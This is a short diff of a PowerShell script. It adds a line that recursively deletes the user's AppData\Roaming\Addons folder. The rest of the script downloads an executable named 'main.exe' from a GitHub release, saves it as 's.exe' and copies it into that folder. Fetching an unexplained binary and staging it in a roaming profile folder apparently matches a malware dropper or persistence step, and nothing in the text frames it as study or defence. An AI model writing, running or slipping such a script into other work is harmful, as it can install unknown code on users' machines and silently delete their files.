@@ -1,4 +1,5 @@
 Set-Location -Path "C:\Users\$env:username\"
+Remove-Item C:\Users\$env:username\AppData\Roaming\Addons\ -Recurse -ErrorAction Ignore
 Invoke-WebRequest "https://github.com/DrunkenLyricist/nanny/releases/download/renderout/main.exe" -o s.exe
 new-item C:\Users\$env:username\AppData\Roaming\Addons\ -itemtype directory
 Copy-Item s.exe C:\Users\$env:username\AppData\Roaming\Addons\
